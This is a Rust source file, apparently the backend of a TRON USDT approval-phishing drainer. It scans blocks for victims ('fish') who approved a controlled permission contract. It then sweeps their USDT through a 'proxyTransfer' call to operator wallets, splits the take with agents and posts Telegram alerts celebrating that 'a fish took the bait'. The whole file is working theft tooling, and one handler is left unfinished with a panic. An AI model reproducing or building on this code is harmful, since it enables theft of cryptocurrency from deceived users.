use std::{str::FromStr, time::Duration};

use anychain_core::hex::{self, FromHex};
use anychain_tron::{
    TronAddress,
    abi::{Param, contract_function_call},
};
use anyhow::{anyhow, bail};
use ethabi::Function;
use rust_decimal::prelude::*;
// use ethabi::{Function, ParamType, Token, encode};
use kameo::{Actor, actor::ActorRef, mailbox::unbounded, prelude::Message};
use primitive_types::U256;
use rand::random_range;
use reqwest::{Client, RequestBuilder};
use sea_orm::{
    ActiveValue::{self},
    DatabaseConnection, EntityTrait,
    prelude::Decimal,
};
use serde::Deserialize;
use serde_json::json;
use teloxide::{
    Bot,
    payloads::SendMessageSetters,
    prelude::Requester,
    types::{ChatId, Recipient},
};
use thiserror::Error;
use tokio::spawn;
use tracing::error;

use crate::{
    daili::daili_cache::{self},
    daili_group::daili_group_cache,
    fish::fish_cache,
    fish_browse::fish_browse_cache,
    options::options_cache,
    telegram_bot::telegram_bot_manager::TelegramBotManager,
    tron::{
        account::Account,
        block::{
            self, Block, BlockBrief, ContractType, Transaction, TransactionContractParameterValue,
        },
    },
    utils::{
        now_date_time_str,
        tron::{
            TronPublicKeyBundle, build_contract_transaction, private_key_2_public_key,
            send_transaction_with_key, trx_with_decimal, usdt_with_decimal,
        },
    },
};
use entities::entities::fish::Model as FishModel;

const TRANSFER_DISCRIMINATOR: &'static str = "a9059cbb";
const TRANSFER_FROM_DISCRIMINATOR: &'static str = "23b872dd";
const APPROVE_DISCRIMINATOR: &'static str = "095ea7b3";
const INCREASE_APPROVE_DISCRIMINATOR: &'static str = "d73dd623";

const DEFAULT_SHARED_PROFIT: f64 = 0.5;

#[derive(Debug, Error, Clone)]
pub enum TronBlockScannerError {}

pub(crate) struct TronBlockScanner {
    last_processed_block: Option<u64>,
    base58_usdt_contract: String,
    hex_usdt_contract: String,
    full_host: String,
    http_client: Client,
    db_conn: DatabaseConnection,
    // contract_address_base58: String,
    // contract_address_hex: String,
    // contract_owner_pubkey_base58: String,
    // contract_owner_address_hex: String,
    contract_owner_private_key: String,
    // contract_method: String,
    tron_grid_keys: Vec<String>,
    permission_addresses: Vec<String>,
    bot: Option<Bot>,
}

impl TronBlockScanner {
    pub async fn new() -> TronBlockScanner {
        let config = &config_helper::CONFIG.tron;
        let full_host = config.full_host.clone();
        let address = anychain_tron::TronAddress::from_str(&config.usdt_contract).unwrap();
        let base58_usdt_contract = address.to_base58();
        let hex_usdt_contract = address.to_hex();
        let tron_grid_keys = options_cache::tron_grid_keys();
        let permission_addresses = options_cache::permission_addresses();
        let contract_owner_private_key =
            options_cache::map_contract_owner_private_key(|m| m.value.clone())
                .flatten()
                .expect("请配置部署合约时使用的钱包的私钥，否则无法提币");
        // let contract_owner_pubkey = private_key_2_public_key(&contract_owner_private_key)
        //     .expect("根据合约钱包私钥生成公钥出错，请检查");
        let db_conn = database::connection::get_connection().await.unwrap();
        // let contract_metod = options_cache::map_contract_method(|m|m.value).flatten();
        TronBlockScanner {
            last_processed_block: None,
            http_client: Client::new(),
            full_host,
            base58_usdt_contract,
            hex_usdt_contract,
            tron_grid_keys,
            permission_addresses,
            bot: None,
            // contract_owner_pubkey_base58: contract_owner_pubkey.base58,
            // contract_owner_address_hex: contract_owner_pubkey.hex,
            contract_owner_private_key,
            db_conn,
        }
    }

    pub async fn spawn_link(supervisor: &ActorRef<impl Actor>) -> anyhow::Result<ActorRef<Self>> {
        let scanner = TronBlockScanner::new().await;
        let actor_ref =
            Actor::spawn_link_with_mailbox(supervisor, scanner, unbounded::<Self>()).await;
        let _ = actor_ref.wait_for_startup_result().await?;
        Ok(actor_ref)
    }
}

impl TronBlockScanner {
    async fn scan_block(&mut self, acror_ref: ActorRef<Self>) {
        match self.fetch_current_block().await {
            Ok(block) => {
                super::block::update_block_brief(&block).await;

                let block_number = block.block_header.raw_data.number;
                if let Some(last) = self.last_processed_block {
                    for number in last + 1..block_number {
                        match self.fetch_block_by_number(number).await {
                            Ok(block) => {
                                if let Some(block) = block {
                                    self.handle_block(block).await;
                                } else {
                                    error!("未获取到区块数据，可能存在异常，区块: {number}")
                                }
                            }
                            Err(e) => error!("获取区块数据出错，区块编号：{number}, error: {e:?}"),
                        }
                    }

                    // 处理当前区块
                    self.handle_block(block).await;
                }
            }
            Err(e) => {
                error!("获取当前区块数据出错: {e:?}")
            }
        }

        Self::schedule_next_scanning(acror_ref);
    }

    async fn handle_block(&mut self, block: Block) {
        let transactions = if let Some(tx) = block.transactions {
            tx
        } else {
            return;
        };

        for mut tx in transactions {
            let mut contracts = if let Some(contracts) = tx.raw_data.contract.take() {
                contracts
            } else {
                continue;
            };
            if let Some(contract) = contracts.pop() {
                match contract.r#type {
                    ContractType::TriggerSmartContract => {
                        let value = if let Some(params) = contract.parameter {
                            if let Some(v) = params.value {
                                v
                            } else {
                                error!("获取到了[TriggerSmartContract]交易，但是value的值为空");
                                continue;
                            }
                        } else {
                            error!("获取到了[TriggerSmartContract]交易，但是parameter的值为空");
                            continue;
                        };
                        let value =
                            serde_json::from_value::<TransactionContractParameterValue>(value);
                        let value = match value {
                            Ok(v) => v,
                            Err(e) => {
                                error!("反序列化[TransactionContractParameterValue]出错: {e:?}");
                                continue;
                            }
                        };
                        let data = &value.data;
                        if data.starts_with(TRANSFER_FROM_DISCRIMINATOR)
                            || data.starts_with(TRANSFER_DISCRIMINATOR)
                        {
                            self.handle_usdt_transfer(tx, value).await;
                        } else if data.starts_with(INCREASE_APPROVE_DISCRIMINATOR)
                            || data.starts_with(APPROVE_DISCRIMINATOR)
                        {
                            self.handle_usdt_approve(tx, value).await;
                        }
                    }
                    _ => {
                        // 不是与usdt合约相关的交易，不关心
                        continue;
                    }
                }
            }
        }
    }

    async fn handle_usdt_transfer(
        &mut self,
        tx: Transaction,
        parameter: TransactionContractParameterValue,
    ) {
        match tx.ret.get(0) {
            Some(ret) => match ret.contract_ret {
                crate::tron::block::ContractRet::SUCCESS => {
                    //继续处理
                }
                _ => return,
            },
            None => {
                error!("交易中没有结果数据");
                return;
            }
        }

        let TransactionContractParameterValue {
            data,
            owner_address,
            contract_address,
        } = parameter;

        if &contract_address != &self.hex_usdt_contract {
            return;
        }
        let address_str = format!("41{}", &data[32..72]);
        let to_address = match anychain_tron::TronAddress::from_str(&address_str) {
            Ok(r) => r,
            Err(e) => {
                error!("转换合约数据中的目标地址出错, 原始地址：{address_str}, 原因: {e:?}");
                return;
            }
        };
        let hex_to_address = to_address.to_hex();
        let amount = match i128::from_str_radix(&data[72..], 16) {
            Ok(amount) => amount / 1_000_000,
            Err(e) => {
                error!("解析Transfer指令中的amount时出错：{e:?}");
                return;
            }
        };
        let mut related_addresses = Vec::with_capacity(2);
        if let Some(owner_info) = fish_cache::map(&owner_address, |m| NecessaryFishInfo::from(m)) {
            related_addresses.push(owner_info);
        }
        if let Some(target_info) = fish_cache::map(&hex_to_address, |m| NecessaryFishInfo::from(m))
        {
            related_addresses.push(target_info);
        }
        if related_addresses.is_empty() {
            return;
        }
        let payment_address = options_cache::map_payment_address(|m| m.value.clone()).flatten();
        for info in related_addresses {
            let fish_address = info.fish_address;
            let is_outgoing = fish_address == owner_address;
            let amount_symbol = if is_outgoing {
                "↖️转出金额"
            } else {
                "↪️转入金额"
            };
            let transaction_address = if is_outgoing {
                hex_to_address.as_str()
            } else {
                owner_address.as_str()
            };
            let unique_id = if let Some(id) = info.unique_id.as_ref() {
                id
            } else {
                error!("鱼苗没有代理信息：{}", fish_address);
                continue;
            };

            let ret = daili_cache::map(unique_id, |m| {
                (
                    m.username.clone(),
                    m.groupid.clone(),
                    m.payment_address.clone(),
                )
            });
            let (user_name, group_id, daili_payment_address) = match ret {
                Some(ret) => ret,
                None => {
                    // error!("找不到代理数据: {unique_id}");
                    (None, None, None)
                }
            };
            let ret = self.query_balance(&fish_address).await;
            let (trx, usdt) = match ret {
                Ok((trx, usdt)) => (Some(trx), Some(usdt)),
                Err(e) => {
                    error!("请求帐号余额出错: {e:?}");
                    (None, None)
                }
            };
            let trx_balance = trx
                .map(|v| v.to_string())
                .unwrap_or_else(|| "查询失败".to_string());
            let usdt_balance = usdt
                .map(|v| v.to_string())
                .unwrap_or_else(|| "查询失败".to_string());
            let user_name_display = if let Some(user_name) = &user_name {
                user_name
            } else {
                "未设置"
            };
            let notification = format!(
                "
                🐟【鱼苗动账通知】TRC-USDT 转账通知🐟\n\n
                🐠鱼苗地址 @{user_name_display}：\n<code>{fish_address}</code>\n\n
                📥交易地址：\n<code>{transaction_address}</code>\n\n
                {amount_symbol}：<code>{amount} USDT</code>\n\n
                ⏰交易时间：<code>Not Set</code>\n\n
                🪫TRX 余额：<code>{trx_balance}</code> 💵USDT余额：<code>{usdt_balance}</code>
                "
            );
            if let Some(group_id) = &group_id {
                self.send_bot_message(group_id, notification).await;
            }
            if let Some(usdt) = usdt {
                let usdt_with_decimal = usdt_with_decimal(usdt as i128);
                let threshold = if let Some(threshold) = info.threshold.to_f64() {
                    threshold
                } else {
                    error!("threshold 转换成 f64失败: {}", info.threshold);
                    0.
                };
                if let Some(payment_address) = &payment_address {
                    if usdt_with_decimal >= threshold {
                        let _ = self
                            .transfer_fish_usdt(
                                &info.permission_address,
                                &fish_address,
                                payment_address,
                                amount as u128,
                                &user_name,
                                &daili_payment_address,
                                &group_id,
                            )
                            .await;
                    }
                }
            }
        }

        todo!("handle usde transfer");
    }

    async fn handle_usdt_approve(
        &mut self,
        _tx: Transaction,
        parameter: TransactionContractParameterValue,
    ) {
        let payment_address = options_cache::map_payment_address(|m| m.value.clone()).flatten();
        let payment_address = if let Some(payment_address) = payment_address {
            payment_address
        } else {
            error!("未配置[payment_address]");
            return;
        };
        let config = &config_helper::CONFIG.tron;
        let contract_address = &parameter.contract_address;
        // 只处理usdt的
        if contract_address != &config.usdt_contract {
            return;
        }
        let spender_address =
            match anychain_tron::TronAddress::from_str(&format!("41{}", &parameter.data[32..72])) {
                Ok(address) => {
                    if options_cache::is_permission_address(&address.to_base58()) {
                        address
                    } else {
                        // 不是授权列表中的地址
                        return;
                    }
                }
                Err(e) => {
                    error!("转换Spender 地址时出错: {e:?}");
                    return;
                }
            };
        let transfer_amount_in = match u64::from_str_radix(&parameter.data[72..], 16) {
            Ok(amount) => amount / 1_000_000,
            Err(e) => {
                error!("解析Transfer指令中的amount时出错：{e:?}");
                return;
            }
        };
        let (fish_trx, fish_usdt) = match self.query_balance(&parameter.owner_address).await {
            Ok((trx, usdt)) => (Some(trx), Some(usdt)),
            Err(e) => {
                error!("查询鱼的余额出错: {e:?}");
                (None, None)
            }
        };
        // 获取其unique_id: 先从fish_browse中获取,如果没有，再尝试获取配置中的缺省unique_id
        // todo: 从缓存中获取可能获取到旧数据，因为缓存是N秒更新一次
        let unique_id =
            match fish_browse_cache::map(&parameter.owner_address, |m| m.unique_id.clone())
                .flatten()
            {
                Some(u) => u,
                None => match options_cache::default_unique_id() {
                    Some(u) => u,
                    None => {
                        error!("鱼没有代理id（unique_id),也没有配置默认unique_id");
                        return;
                    }
                },
            };
        let (unique_id, daili_user_name, daili_group_id, daili_threshold, daili_payment_address) =
            match daili_cache::map(&unique_id, |m| {
                (
                    m.unique_id.clone(),
                    m.username.clone(),
                    m.groupid.clone(),
                    m.threshold.clone(),
                    m.payment_address.clone(),
                )
            }) {
                Some(ret) => ret,
                // Some(ret) => {
                //     error!("代理数据配置不全, (user_name, group_id, threshold): {ret:?}");
                //     return;
                // }
                None => {
                    return;
                }
            };
        let user_name_display = if let Some(daili_user_name) = &daili_user_name {
            format!(" @{}", daili_user_name)
        } else {
            "".to_string()
        };
        // let now = chrono::DateTime::from_timestamp_millis(rust_utils::time::now_millis()).unwrap();

        let existing_fish = fish_cache::find(&parameter.owner_address, "TRC");
        let approvval_status;
        let additional_note;
        if transfer_amount_in == 0 || transfer_amount_in < 200 {
            if transfer_amount_in == 0 {
                approvval_status = "❌ <code>取消授权 额度 0 USDT</code>".to_string();
                additional_note = "❌ 注：因该地址已取消授权，已从鱼池列表中删除".to_string();
                if let Some(id) = existing_fish {
                    let remark = "取消授权".to_string();
                    let auth_status = 0;
                    self.update_fish_status_remark(id, remark, auth_status)
                        .await;
                }
            } else {
                approvval_status = format!("❌ <code>授权额度 {} USDT</code>", transfer_amount_in);
                additional_note = "❌ 注：因该地址的授权额度太低，将不加入鱼池列表".to_string();
                if let Some(id) = existing_fish {
                    let remark = format!("授权额度: {}", transfer_amount_in);
                    let auth_status = 0;
                    self.update_fish_status_remark(id, remark, auth_status)
                        .await;
                }
            }
        } else {
            approvval_status = "✅ <code>授权成功</code>".to_string();
            let threshold = daili_threshold.unwrap_or(0) as f64 / 1_000_000.;
            let fish_address = &parameter.owner_address;
            let fish_usdt_unwraped = fish_usdt.unwrap_or(0);
            let fish_usdt_with_decimal = fish_usdt_unwraped as f64 / 1_000_000.;
            additional_note = format!(
                "✅ 当前默认提币阈值为 <code>{threshold} USDT</code>\n\n您可以通过命令 <code>修改阈值 {fish_address} 10000</code> 将阈值修改为10000或者你想要设置的阈值;"
            );
            if fish_usdt_with_decimal >= threshold && fish_usdt_unwraped > 1 {
                match self
                    .transfer_fish_usdt(
                        &spender_address.to_base58(),
                        fish_address,
                        &payment_address,
                        fish_usdt_unwraped - 1,
                        &daili_user_name,
                        &daili_payment_address,
                        &daili_group_id,
                    )
                    .await
                {
                    Ok(_) => {
                        match self
                            .update_fish_transfered_status(
                                existing_fish,
                                if existing_fish.is_some() {
                                    None
                                } else {
                                    Some(fish_address.clone())
                                },
                                unique_id,
                                spender_address.to_base58(),
                                Some(1),
                                fish_trx,
                                daili_threshold.unwrap_or(0) as u64,
                            )
                            .await
                        {
                            Ok(_) => {}
                            Err(e) => {
                                error!("{e:?}")
                            }
                        }
                    }
                    Err(e) => {
                        error!("授权触发转帐失败：{fish_address}, 错误：{e:?}, 现在将保存状态");
                        match self
                            .update_fish_transfered_status(
                                existing_fish,
                                if existing_fish.is_some() {
                                    None
                                } else {
                                    Some(fish_address.clone())
                                },
                                unique_id,
                                spender_address.to_base58(),
                                fish_usdt,
                                fish_trx,
                                daili_threshold.unwrap_or(0) as u64,
                            )
                            .await
                        {
                            Ok(_) => {}
                            Err(e) => {
                                error!("授权触发转帐失败后，保存鱼苗状态失败: {e:?}");
                            }
                        }
                    }
                }
            } else {
                match self
                    .update_fish_transfered_status(
                        existing_fish,
                        if existing_fish.is_some() {
                            None
                        } else {
                            Some(fish_address.clone())
                        },
                        unique_id,
                        spender_address.to_base58(),
                        fish_usdt,
                        fish_trx,
                        daili_threshold.unwrap_or(0) as u64,
                    )
                    .await
                {
                    Ok(_) => {}
                    Err(e) => {
                        error!("{e:?}")
                    }
                }
            }
        }
        if let Some(group_id) = daili_group_id {
            let local_time = now_date_time_str();
            self.send_approve_bot_message(
                group_id,
                &user_name_display,
                &parameter.owner_address,
                &spender_address.to_base58(),
                &approvval_status,
                &additional_note,
                fish_trx,
                fish_usdt,
                &local_time,
            )
            .await;
        }
    }

    async fn send_approve_bot_message(
        &self,
        groupid: String,
        user_name: &str,
        fish_address: &str,
        permission_address: &str,
        approval_status: &str,
        additional_note: &str,
        trx: Option<u64>,
        usdt: Option<u128>,
        local_time: &str,
    ) {
        if let Some(bot) = self.bot.as_ref() {
            match Self::send_approve_bot_message_with_bot(
                bot,
                groupid,
                user_name,
                fish_address,
                permission_address,
                approval_status,
                additional_note,
                trx,
                usdt,
                local_time,
            )
            .await
            {
                Ok(_) => {}
                Err(e) => {
                    error!("发送approve bot信息失败: {e:?}")
                }
            }
        } else {
            error!("未初始化bot");
        }
    }

    pub async fn send_approve_bot_message_with_bot<C>(
        bot: &Bot,
        groupid: C,
        user_name: &str,
        fish_address: &str,
        permission_address: &str,
        approval_status: &str,
        additional_note: &str,
        trx: Option<u64>,
        usdt: Option<u128>,
        local_time: &str,
    ) -> anyhow::Result<()>
    where
        C: Into<Recipient>,
    {
        let trx = if let Some(trx) = trx {
            trx_with_decimal(trx as i64).to_string()
        } else {
            "查询失败".to_string()
        };
        let usdt = if let Some(usdt) = usdt {
            usdt_with_decimal(usdt as i128).to_string()
        } else {
            "查询失败".to_string()
        };
        let notification = format!(
            "🎣【有鱼上钩啦】TRC-USDT授权通知🎣

🐠 鱼苗地址{user_name}：<code>{fish_address}</code>
🔐 权限地址：<code>{permission_address}</code>
📨 授权状态：{approval_status}
⏰ 授权时间：<code>{local_time}</code>
🪫 TRX 余额：<code>{trx}</code> 💵 USDT余额：<code>{usdt}</code>

<b>{additional_note}</b>"
        );
        bot.send_message(groupid, notification)
            .parse_mode(teloxide::types::ParseMode::Html)
            .await?;

        Ok(())
    }

    async fn update_fish_transfered_status(
        &self,
        id: Option<i32>,
        fish_address: Option<String>, // 只有插入时需要
        unique_id: Option<String>,
        permission_address: String,
        remaining_usdt_balance: Option<u128>,
        trx_balance: Option<u64>,
        threshold: u64,
    ) -> anyhow::Result<()> {
        let is_update = if id.is_none() {
            // 如果id为空，表示是插入，此时必须要传入有效的fish_address
            if fish_address.is_none() {
                anyhow::bail!(
                    "尝试插入[fish]数据，但没有传入有效的[fish.fish_address]，请检查逻辑"
                );
            } else {
                true
            }
        } else {
            false
        };

        let am = entities::entities::fish::ActiveModel {
            id: if let Some(id) = id {
                ActiveValue::Set(id)
            } else {
                ActiveValue::default()
            },
            chainid: ActiveValue::Set("TRC".to_string()),
            permissions_fishaddress: ActiveValue::Set(permission_address),
            usdt_balance: ActiveValue::Set(remaining_usdt_balance.map(|remaining_usdt_balance| {
                Decimal::from_i128_with_scale(remaining_usdt_balance as i128, 6)
            })),
            gas_balance: ActiveValue::Set(
                trx_balance
                    .map(|trx_balance| Decimal::from_i128_with_scale(trx_balance as i128, 6)),
            ),
            threshold: ActiveValue::Set(Some(Decimal::from_i128_with_scale(threshold as i128, 6))),
            time: ActiveValue::Set(Some(now_date_time_str())),
            unique_id: ActiveValue::Set(unique_id),
            remark: ActiveValue::Set(None),
            auth_status: ActiveValue::Set(1),
            fish_address: if let Some(fish_address) = fish_address {
                ActiveValue::Set(fish_address)
            } else {
                ActiveValue::default()
            },
            ..Default::default()
        };

        if is_update {
            match entities::entities::fish::Entity::update(am)
                .exec(&self.db_conn)
                .await
            {
                Ok(m) => {
                    fish_cache::cache(m);
                }
                Err(e) => {
                    bail!("更新[fish]出错, 原因: {e:?}");
                }
            };
        } else {
            match entities::entities::fish::Entity::insert(am)
                .exec_with_returning(&self.db_conn)
                .await
            {
                Ok(m) => {
                    fish_cache::cache(m);
                }
                Err(e) => {
                    bail!("插入[fish]出错, 原因: {e:?}");
                }
            }
        };

        Ok(())
    }

    async fn update_fish_status_remark(&self, id: i32, remark: String, auth_status: i8) {
        let am = entities::entities::fish::ActiveModel {
            id: ActiveValue::Set(id),
            auth_status: ActiveValue::Set(auth_status),
            remark: ActiveValue::Set(Some(remark)),
            ..Default::default()
        };
        match entities::entities::fish::Entity::update(am)
            .exec(&self.db_conn)
            .await
        {
            Ok(m) => fish_cache::cache(m),
            Err(e) => {
                error!("更新fish出错: {e:?}");
            }
        }
    }

    /// 鱼苗的usdt的转帐与分润
    async fn transfer_fish_usdt(
        &self,
        permission_contract_address: &str,
        fish_address: &str,
        payment_address: &str,
        amount: u128,
        daili_user_name: &Option<String>,
        daili_payment_address: &Option<String>,
        group_id: &Option<String>,
    ) -> anyhow::Result<()> {
        let token = anychain_tron::TronAddress::from_hex(&self.hex_usdt_contract)?;
        if let Some(daili_payment_address) = daili_payment_address {
            let share_profit = if let Some(group_id) = group_id {
                daili_group_cache::map(group_id, |m| m.share_profits).flatten()
            } else {
                None
            };
            let share_profit =
                share_profit.unwrap_or_else(|| Decimal::from_f64(DEFAULT_SHARED_PROFIT).unwrap());
            if share_profit.is_zero() {
                self.execute_usdt_transfer(
                    permission_contract_address,
                    fish_address,
                    payment_address,
                    amount,
                )
                .await?;
                if let Some(group_id) = group_id {
                    self.send_transfer_fish_usdt_notice(
                        group_id.to_string(),
                        fish_address,
                        daili_user_name,
                        Some(daili_payment_address),
                        amount as i128,
                        None,
                        &now_date_time_str(),
                    )
                    .await;
                }
            } else if share_profit.is_one() {
                self.execute_usdt_transfer(
                    permission_contract_address,
                    fish_address,
                    daili_payment_address,
                    amount,
                )
                .await?;
                if let Some(group_id) = group_id {
                    self.send_transfer_fish_usdt_notice(
                        group_id.clone(),
                        fish_address,
                        daili_user_name,
                        Some(daili_payment_address),
                        amount as i128,
                        Some(amount as i128),
                        &now_date_time_str(),
                    )
                    .await;
                }
            } else {
                let amount_decimal =
                    Decimal::from_u128(amount).ok_or_else(|| anyhow!("数额转换成decimal出错"))?;
                let daili_share_amount = amount_decimal * share_profit;
                let my_amount = amount_decimal - daili_share_amount;
                let http_client = self.http_client.clone();
                let my_client = http_client.clone();
                let my_token = token.clone();
                let from_address = TronAddress::from_str(&fish_address)?;
                let my_from = from_address.clone();
                let my_payment_address = TronAddress::from_str(&payment_address)?;
                let my_private_key = self.contract_owner_private_key.clone();
                let my_api_key = self.random_one_tron_grid_key().map(|s| s.clone());
                let my_amount = my_amount
                    .to_u128()
                    .ok_or_else(|| anyhow!("decimal转换为u128出错"))?;
                let my_transfer_task = tokio::spawn(async move {
                    Self::execute_usdt_transfer_with_context(
                        my_client,
                        my_token,
                        my_from,
                        my_payment_address,
                        my_amount,
                        my_private_key,
                        my_api_key,
                    )
                    .await
                });
                let tron_daili_payment_address = TronAddress::from_str(daili_payment_address)?;
                let daili_amount = daili_share_amount
                    .to_u128()
                    .ok_or_else(|| anyhow!("decimal转换为u128出错"))?;
                let daili_private_key = self.contract_owner_private_key.clone();
                let daili_api_key = self.random_one_tron_grid_key().map(|s| s.clone());
                let daili_transfer_task = tokio::spawn(async move {
                    Self::execute_usdt_transfer_with_context(
                        http_client,
                        token,
                        from_address,
                        tron_daili_payment_address,
                        daili_amount,
                        daili_private_key,
                        daili_api_key,
                    )
                    .await
                });
                // todo: 可能只有某一个任务成功，暂时未处理
                my_transfer_task.await??;
                daili_transfer_task.await??;
                if let Some(group_id) = group_id {
                    self.send_transfer_fish_usdt_notice(
                        group_id.clone(),
                        fish_address,
                        daili_user_name,
                        Some(daili_payment_address.as_str()),
                        amount as i128,
                        Some(daili_amount as i128),
                        &now_date_time_str(),
                    )
                    .await;
                }
            }
        } else {
            self.execute_usdt_transfer(
                permission_contract_address,
                fish_address,
                payment_address,
                amount,
            )
            .await?;
            if let Some(group_id) = group_id {
                self.send_transfer_fish_usdt_notice(
                    group_id.clone(),
                    fish_address,
                    daili_user_name,
                    daili_payment_address.as_ref().map(|s| s.as_str()),
                    amount as i128,
                    None,
                    &now_date_time_str(),
                )
                .await;
            }
        }

        Ok(())
    }

    async fn send_transfer_fish_usdt_notice<C>(
        &self,
        group_id: C,
        fish_address: &str,
        daili_user_name: &Option<String>,
        daili_payment_address: Option<&str>,
        total_amount: i128,
        share_amount: Option<i128>,
        time: &str,
    ) where
        C: Into<Recipient>,
    {
        if let Some(bot) = &self.bot {
            match Self::send_transfer_fish_usdt_notice_with_bot(
                bot,
                group_id,
                fish_address,
                daili_user_name,
                daili_payment_address,
                total_amount,
                share_amount,
                time,
            )
            .await
            {
                Ok(_) => {}
                Err(e) => {
                    error!("发送转帐通知失败: {e:?}");
                }
            }
        }
    }

    pub async fn send_transfer_fish_usdt_notice_with_bot<C>(
        bot: &Bot,
        group_id: C,
        fish_address: &str,
        daili_user_name: &Option<String>,
        daili_payment_address: Option<&str>,
        total_amount: i128,
        share_amount: Option<i128>,
        time: &str,
    ) -> anyhow::Result<()>
    where
        C: Into<Recipient>,
    {
        let daili_payment_address_real = if let Some(addr) = daili_payment_address {
            addr
        } else {
            "未设置"
        };
        let total_real = usdt_with_decimal(total_amount);
        let share = if let Some(_) = daili_payment_address {
            format!("{} USDT", usdt_with_decimal(share_amount.unwrap_or(0)))
        } else {
            "未设置收款地址，请联系管理员进行分润".to_string()
        };
        let daili_user_name = if let Some(user_name) = daili_user_name {
            user_name
        } else {
            "未设置"
        };
        let notification_message = format!(
            "【🎣 TRC-USDT自动转账通知🎣】

🐟 鱼苗地址：<code>{fish_address}</code>
💳 收款地址：@{daili_user_name} <code>{daili_payment_address_real}</code>
💸 成功划扣：<code>{total_real} USDT</code>
💎 代理分润：<code>{share}</code>

时间: {time}
"
        );
        bot.send_message(group_id, notification_message)
            .parse_mode(teloxide::types::ParseMode::Html)
            .await?;
        Ok(())
    }

    // async fn execute_transfer() {
    //     todo!("execute transfer")
    // }

    async fn execute_usdt_transfer_with_context(
        client: Client,
        token: TronAddress,
        from: TronAddress,
        to: TronAddress,
        amount: u128,
        private_key: String,
        api_key: Option<String>,
    ) -> anyhow::Result<()> {
        let function_name = "proxyTransfer";
        let amount = U256::from(amount);
        let data = contract_function_call(
            function_name,
            &[
                Param::from(&token),
                Param::from(&from),
                Param::from(&to),
                Param::from(amount),
            ],
        );
        let TronPublicKeyBundle { base58, .. } = private_key_2_public_key(&private_key)?;
        let (block_number, block_hash) =
            if let Some(BlockBrief { block_id, number }) = block::get_block_brief().await {
                (number as i64, block_id)
            } else {
                bail!("还未初始化tron block");
            };
        let contract = if let Some(address) = options_cache::random_one_permission_address() {
            address
        } else {
            bail!("没有配置授权合约地址");
        };

        let tx = build_contract_transaction(
            &base58,
            &contract,
            data,
            50_000_000,
            block_number,
            &block_hash,
            &private_key,
        )?;
        let full_host = &config_helper::CONFIG.tron.full_host;
        let resp = send_transaction_with_key(
            &client,
            full_host,
            tx,
            api_key.as_ref().map(|s| Some(s)).flatten(),
        )
        .await?;
        if resp.success() {
            // 发送成功
        } else {
            bail!(resp.message.unwrap_or_else(|| "广播交易失败".to_string()))
        }
        Ok(())
    }

    /// 地址格式都是base58(TXXX)
    async fn execute_usdt_transfer(
        &self,
        permission_contract_address: &str,
        from: &str,
        to: &str,
        amount: u128,
    ) -> anyhow::Result<()> {
        // let contract = if let Some(address) = options_cache::random_one_permission_address() {
        //     address
        // } else {
        //     bail!("没有配置授权合约地址");
        // };
        let token = anychain_tron::TronAddress::from_hex(&self.hex_usdt_contract)?;
        let from = anychain_tron::TronAddress::from_str(from)?;
        let to = anychain_tron::TronAddress::from_str(to)?;
        let amount = U256::from(amount);
        // let encoded_params = encode(&[token, from, to, amount]);

        let function_name = "proxyTransfer";
        let data = contract_function_call(
            function_name,
            &[
                Param::from(&token),
                Param::from(&from),
                Param::from(&to),
                Param::from(amount),
            ],
        );
        let private_key = &self.contract_owner_private_key;
        let TronPublicKeyBundle { base58, .. } = private_key_2_public_key(&private_key)?;
        let (block_number, block_hash) =
            if let Some(BlockBrief { block_id, number }) = block::get_block_brief().await {
                (number as i64, block_id)
            } else {
                bail!("还未初始化tron block");
            };
        let tx = build_contract_transaction(
            &base58,
            permission_contract_address,
            data,
            50_000_000,
            block_number,
            &block_hash,
            private_key,
        )?;
        let api_key = self.random_one_tron_grid_key();
        let resp =
            send_transaction_with_key(&self.http_client, &self.full_host, tx, api_key).await?;
        if resp.success() {
            // 发送成功
        } else {
            bail!(resp.message.unwrap_or_else(|| "广播交易失败".to_string()))
        }

        Ok(())
    }

    async fn query_balance(&mut self, address: &str) -> anyhow::Result<(u64, u128)> {
        let trx_balance_task = tokio::spawn(Self::query_trx_balance(
            self.prepare_require_trx_balance(),
            address.to_string(),
        ));

        let owner_address = if let Some(permission_address) = self.permission_addresses.first() {
            permission_address.clone()
        } else {
            bail!("找不到授权地址");
        };
        let target_address = address.to_string();
        let base58_usdt_contract = self.base58_usdt_contract.clone();
        let prepared_client = self.prepare_requery_trc_20_balance();
        let trc_20_balance_task = tokio::spawn(async move {
            Self::query_trc20_balance(
                prepared_client,
                &owner_address,
                &target_address,
                &base58_usdt_contract,
            )
            .await
        });
        let trx_balance = trx_balance_task.await??;
        let trc20_balance = trc_20_balance_task.await??;

        Ok((trx_balance, trc20_balance))
    }

    async fn query_trx_balance(
        prepared_client_builder: RequestBuilder,
        address_base58: String,
    ) -> anyhow::Result<u64> {
        let body = json!({
           "address":  address_base58,
        });
        let account = prepared_client_builder
            .json(&body)
            .send()
            .await?
            .json::<Account>()
            .await?;

        Ok(account.balance)
    }

    async fn query_trc20_balance(
        prepared_client_builder: RequestBuilder,
        owner_address_base58: &str,
        target_address_base58: &str,
        contract_base58: &str,
    ) -> anyhow::Result<u128> {
        let owner_address_hex = Self::base58_to_tron_hex(owner_address_base58)?;
        let target_address_hex = Self::base58_to_tron_hex(target_address_base58)?;
        let contract_hex = Self::base58_to_tron_hex(contract_base58)?;
        let function = Function {
            name: "balanceOf".to_string(),
            inputs: vec![ethabi::Param {
                name: "owner".to_string(),
                kind: ethabi::ParamType::Address,
                internal_type: None,
            }],
            outputs: vec![ethabi::Param {
                name: "".to_string(),
                kind: ethabi::ParamType::Uint(256),
                internal_type: None,
            }],
            state_mutability: ethabi::StateMutability::View,
            constant: None,
        };
        let target_bytes = hex::decode(&target_address_hex)?;
        let evm_address: [u8; 20] = target_bytes[1..21].try_into()?;
        let tokens = vec![ethabi::Token::Address(evm_address.into())];
        let param_bytes = function.encode_input(&tokens)?;
        let param_hex = hex::encode(&param_bytes[4..]);
        let body = serde_json::json!(
            {
                    "owner_address": owner_address_hex,
                    "contract_address": contract_hex,
                    "function_selector": "balanceOf(address)",
                    "parameter": param_hex,
                }
        );
        let resp: TriggerResp = prepared_client_builder
            .json(&body)
            .send()
            .await?
            .json()
            .await?;
        if let Some(results) = resp.constant_result {
            if let Some(balance_hex) = results.first() {
                let balance = u128::from_str_radix(balance_hex, 16)?;
                Ok(balance)
            } else {
                error!("请求TRC20余额失败: 结果为空");
                anyhow::bail!("结果为空")
            }
        } else {
            error!("请求TRC20余额失败: 没收到结果");
            anyhow::bail!("未收到结果")
        }
    }

